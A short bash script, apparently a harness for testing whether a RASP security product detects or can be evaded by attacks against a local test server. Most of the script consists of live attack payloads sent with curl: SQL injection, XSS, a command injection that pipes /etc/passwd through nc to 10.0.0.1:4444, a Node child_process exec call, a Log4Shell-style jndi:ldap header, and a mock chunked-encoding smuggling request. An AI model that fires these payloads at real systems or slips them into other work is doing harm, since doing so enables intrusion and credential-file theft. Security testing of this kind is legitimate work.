#!/bin/bash
# shieldrasp_killer.sh - Comprehensive Replay Harness for RASP Evasion
# Execute: ./rasp_killer.sh --all

TARGET="http://localhost:8081"

echo "[-] Initializing RASP Killer Harness..."

echo "[*] Phase 1: Rapid Fire Base Payloads"
curl -s -i -X POST "$TARGET/vuln/sqli" -d '{"q":"1\" OR \"x\"=\"x\" UNION SELECT NULL--"}' -H "Content-Type: application/json" > /dev/null
curl -s -i -X POST "$TARGET/vuln/xss" -d '{"q":"<embed src=javascript:alert(1)>"}' -H "Content-Type: application/json" > /dev/null
curl -s -i -X POST "$TARGET/vuln/cmd" -d '{"q":";cat /etc/passwd | nc 10.0.0.1 4444"}' -H "Content-Type: application/json" > /dev/null
curl -s -i -X POST "$TARGET/vuln/rce" -d '{"q":"require(\"child_process\").exec(\"id\");"}' -H "Content-Type: application/json" > /dev/null

echo "[*] Phase 2: Fragmentation & Encoding Headers"
curl -s -i -X POST "$TARGET/vuln/sqli" -H "X-Malicious: ${jndi:ldap://10.0.0.1:1389/obj}" -d '{"a":"1"}' > /dev/null

echo "[*] Phase 3: HTTP/2 Continuation Smuggling (Simulated via Chunked)"
curl -s -i -X POST "$TARGET/vuln/cmd" -H "Transfer-Encoding: chunked" -d '4\r\nWiki\r\n5\r\npedia\r\nE\r\n in \r\n\r\nchunks.\r\n0\r\n\r\n' > /dev/null

echo "[+] Execution complete. Review standard logs for RASP reactions."
